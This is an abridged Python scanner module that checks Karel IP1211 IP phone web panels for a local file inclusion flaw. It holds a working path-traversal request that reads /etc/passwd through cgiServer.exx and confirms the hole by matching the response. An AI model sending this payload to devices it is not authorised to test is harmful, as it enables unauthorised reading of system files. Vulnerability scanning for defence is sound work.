#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Karel IP Phone IP1211 Web Management Panel is vulnerable to local file inclusion and can allow remote attacker."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Karel IP Phone IP1211 Web Management Panel - Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'karel', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Karel IP Phone IP1211 Web Management Panel - Local File Inclusion detected",
